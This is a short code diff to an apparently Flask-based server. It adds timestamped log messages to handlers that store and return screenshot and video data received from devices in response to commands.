@@ -1939,6 +1939,7 @@ def receive_command_result(command_id):
                     "image_base64": result.get("image_base64"),
                     "created_at": datetime.now()
                 })
+                print(f"[{datetime.now().isoformat()}] 📸 Stored {media_type or 'screenshot'} image for device {device_id}")
             if result.get("video_base64"):
                 screenshots_col.insert_one({
                     "device_id": device_id,
@@ -1948,7 +1949,9 @@ def receive_command_result(command_id):
                     "mime_type": result.get("mime_type", "video/mp4"),
                     "created_at": datetime.now()
                 })
+                print(f"[{datetime.now().isoformat()}] 🎬 Stored {media_type or 'record'} video for device {device_id}")
 
+    print(f"[{datetime.now().isoformat()}] ✅ Command result received for {command_id} (device: {device_id})")
     return jsonify({"status": "success"})
 
 @app.route('/api/command/executed/<command_id>', methods=['POST'])
@@ -2040,8 +2043,10 @@ def get_latest_media(device_id):
     )
 
     if not doc:
+        print(f"[{datetime.now().isoformat()}] ⚠️ No {media_type} found for device {device_id}")
         return jsonify({})
 
+    print(f"[{datetime.now().isoformat()}] ✅ Returning {media_type} for device {device_id}")
     return jsonify({
         "image_base64": doc.get("image_base64"),
         "video_base64": doc.get("video_base64"),
